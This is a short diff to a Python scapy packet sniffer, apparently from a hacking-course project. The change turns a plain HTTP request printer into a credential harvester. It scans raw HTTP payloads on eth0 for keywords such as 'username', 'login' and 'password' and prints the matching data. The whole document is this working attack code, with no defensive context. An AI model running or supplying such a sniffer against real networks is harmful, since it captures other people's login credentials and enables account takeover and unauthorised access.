@@ -14,8 +14,16 @@ def sniff(interface):
 
 
 def process_sniffed_packet(packet):
+    # using this layer because scapy do not have http layer filter
     if packet.haslayer(http.HTTPRequest):
-        print(packet)
+        # using this filter from scapy
+        if packet.haslayer(scapy.Raw):
+            # get data we care about it
+            keywords = [b"username", b"user", b"login", b"password", b"pass"]
+            for keyword in keywords:
+                if keyword in packet[scapy.Raw].load:
+                    print(packet[scapy.Raw].load)
+                    break
 
 
 sniff("eth0")
